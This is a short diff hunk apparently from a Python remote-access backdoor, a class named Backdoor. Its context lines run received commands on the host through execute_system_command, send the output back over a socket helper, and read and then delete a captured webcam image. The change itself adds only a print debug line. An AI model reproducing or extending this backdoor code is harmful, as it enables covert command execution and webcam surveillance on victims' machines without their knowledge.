@@ -83,6 +83,7 @@ class Backdoor:
                     command_result = self.read_file("camera.jpg")
                     os.system("rm camera.jpg")
                 else:
+                    print("sometext")
                     command_result = self.execute_system_command(command)                                      
                 self.reliable_send(command_result)
             except:
